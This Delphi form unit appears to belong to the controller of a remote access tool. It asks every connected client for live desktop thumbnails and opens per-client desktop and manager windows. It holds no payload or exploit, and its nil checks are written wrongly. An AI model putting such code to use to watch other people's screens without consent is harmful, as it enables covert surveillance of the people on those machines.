unit UnitMultiDesktop;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ComCtrls, StdCtrls, ExtCtrls, ImgList, UnitMain, jpeg, SocketUnitEx,
  UnitFunctions, UnitCommands, UnitVariables, UnitManager, Menus, UnitDesktop,
  uJSONConfig, UnitConstants;

type
  TFormMultiDesktop = class(TForm)
    lvDesktop: TListView;
    ilThumbs1: TImageList;
    pnl1: TPanel;
    lbl1: TLabel;
    btn1: TButton;
    trckbr1: TTrackBar;
    pm1: TPopupMenu;
    M1: TMenuItem;
    lbl2: TLabel;
    cbb1: TComboBoxEx;
    procedure trckbr1Change(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure btn1Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure lvDesktopDblClick(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure M1Click(Sender: TObject);
  protected
    procedure CreateParams(var Params: TCreateParams) ; override;
  private
    { Private declarations }
  public
    { Public declarations }   
    ThumbSize: Integer;   
    procedure AddThumb(Bmp: TBitmap; ClientId: string);
  end;

var
  FormMultiDesktop: TFormMultiDesktop;

implementation

{$R *.dfm}
     
procedure TFormMultiDesktop.CreateParams(var Params: TCreateParams) ;
begin
  inherited;
  Params.ExStyle := Params.ExStyle or WS_EX_APPWINDOW;
  Params.WndParent := 0;
end;

procedure TFormMultiDesktop.AddThumb(Bmp: TBitmap; ClientId: string);
var
  i: Integer;
begin
  for i := 0 to lvDesktop.Items.Count -1 do
  begin
    if lvDesktop.Items[i].Caption = ClientId then
    begin
      try
        if lvDesktop.Items[i].ImageIndex = -1 then
          lvDesktop.Items[i].ImageIndex := ilThumbs1.Add(Bmp, nil)
        else ilThumbs1.Replace(lvDesktop.Items[i].ImageIndex, Bmp, nil);
      except
      end;
    end;

    Application.ProcessMessages;
  end;
end;

procedure TFormMultiDesktop.trckbr1Change(Sender: TObject);
begin
  case trckbr1.Position of
    0: ThumbSize := 100;
    1: ThumbSize := 128;
    2: ThumbSize := 132;
    3: ThumbSize := 164;
    4: ThumbSize := 200;
    5: ThumbSize := 232;
    6: ThumbSize := 264;
  end;

  ilThumbs1.Width := ThumbSize + 100;
  ilThumbs1.Height := ThumbSize;
end;

procedure TFormMultiDesktop.FormClose(Sender: TObject;
  var Action: TCloseAction);
var
  JSONConfig: TJSONConfig;
  TmpStr: string;
  i: Integer;
begin
  if btn1.Caption = 'Stop' then btn1.Click;
  if lvDesktop.Items.Count = 0 then Exit;
  for i := lvDesktop.Items.Count - 1 downto 0 do lvDesktop.Items.Item[i].Delete;

  JSONConfig := TJSONConfig.Create(WindowsSettings, PROGRAMPASSWORD);
  JSONConfig.WriteInteger('Multi-D width', Width);
  JSONConfig.WriteInteger('Multi-D height', Height);
  JSONConfig.WriteInteger('Multi-D left', Left);
  JSONConfig.WriteInteger('Multi-D top', Top);
  JSONConfig.SaveConfig;
  JSONConfig.Free;
end;

procedure TFormMultiDesktop.btn1Click(Sender: TObject);
var
  ClientDatas: TClientDatas;
  i: Integer;
begin
  if btn1.Caption = 'Start' then
  begin                    
    if lvDesktop.Items.Count = 0 then Exit;
    btn1.Caption := 'Stop';
    trckbr1.Enabled := False;
    cbb1.Enabled := False;

    ilThumbs1.Clear;
    ilThumbs1.Width := ThumbSize + 100;
    ilThumbs1.Height := ThumbSize;

    for i := 0 to lvDesktop.Items.Count - 1 do
    begin
      if lvDesktop.Items.Item[i].Data = nil then
      begin
        lvDesktop.Items.Item[i].Delete;
        Continue;
      end;

      ClientDatas := TClientDatas(lvDesktop.Items.Item[i].Data);
      if (ClientDatas = nil) and (ClientDatas.Node.ChildCount > 0) then Continue;
      lvDesktop.Items.Item[i].ImageIndex := -1;
      ClientDatas.SendDatas(MULTIDESKTOPSTART + '|' + IntToStr(ThumbSize) + '|' +
        IntToStr(cbb1.ItemIndex));
    end;
  end
  else
  begin
    btn1.Caption := 'Start';
    trckbr1.Enabled := True;   
    cbb1.Enabled := True;
    if lvDesktop.Items.Count = 0 then Exit;

    for i := 0 to lvDesktop.Items.Count - 1 do
    begin
      if lvDesktop.Items.Item[i].Data = nil then
      begin
        lvDesktop.Items.Item[i].Delete;
        Continue;
      end;

      ClientDatas := TClientDatas(lvDesktop.Items.Item[i].Data);
      if (ClientDatas = nil) and (ClientDatas.Node.ChildCount > 0) then Continue;
      ClientDatas.SendDatas(MULTIDESKTOPSTOP + '|');
    end;
  end;
end;

procedure TFormMultiDesktop.FormCreate(Sender: TObject);
var
  JSONConfig: TJSONConfig;
  i: Integer;
begin
  //Load window position settings
  JSONConfig := TJSONConfig.Create(WindowsSettings, PROGRAMPASSWORD);
  JSONConfig.LoadConfig;
  i := JSONConfig.ReadInteger('Multi-D width');
  if i <= 0 then Width := 696 else Width := i;
  i := JSONConfig.ReadInteger('Multi-D height');
  if i <= 0 then Height := 360 else Height := i;
  i := JSONConfig.ReadInteger('Multi-D left');
  if i <= 0 then Left := (Screen.Width - Width) div 2 else Left := i;
  i := JSONConfig.ReadInteger('Multi-D top');
  if i <= 0 then Top := (Screen.Height - Height) div 2 else Top := i;
  JSONConfig.Free;

  ThumbSize := 100;
  ilThumbs1.Width := 264;
  ilThumbs1.Height := 100;
  cbb1.ItemIndex := 0;
end;

procedure TFormMultiDesktop.lvDesktopDblClick(Sender: TObject);
var
  ClientDatas: TClientDatas;
  TmpForm: TFormDesktop;
begin
  if not Assigned(lvDesktop.Selected) then Exit;
  ClientDatas := TClientDatas(lvDesktop.Selected.Data);
  if (ClientDatas = nil) and (ClientDatas.Node.ChildCount > 0) then Exit;
  if ClientDatas.Forms[5] <> nil then TFormDesktop(ClientDatas.Forms[5]).Show else
  begin
    TmpForm := TFormDesktop.Create(Self, ClientDatas);
    ClientDatas.Forms[5] := TmpForm;
    TmpForm.Caption := 'Desktop - [' + ClientDatas.UserId + ']';
    TmpForm.Show;
  end;
end;

procedure TFormMultiDesktop.FormShow(Sender: TObject);
begin
  btn1Click(Sender);
end;

procedure TFormMultiDesktop.M1Click(Sender: TObject);
var
  ClientDatas: TClientDatas;
  TmpForm: TFormManager;
  i: Integer;
begin
  for i := 0 to lvDesktop.Items.Count - 1 do
  begin
    if not lvDesktop.Items.Item[i].Selected then Continue;
    ClientDatas := TClientDatas(lvDesktop.Items.Item[i].Data);
    if (ClientDatas = nil) and (ClientDatas.Node.ChildCount > 0) then Continue;
    if ClientDatas.Forms[16] <> nil then TFormManager(ClientDatas.Forms[16]).Show else
    begin
      TmpForm := TFormManager.Create(Self, ClientDatas);
      ClientDatas.Forms[16] := TmpForm;
      TmpForm.Caption := 'Manager - [' + ClientDatas.UserId + ']';
      TmpForm.Show;
    end;
  end;
end;

end.
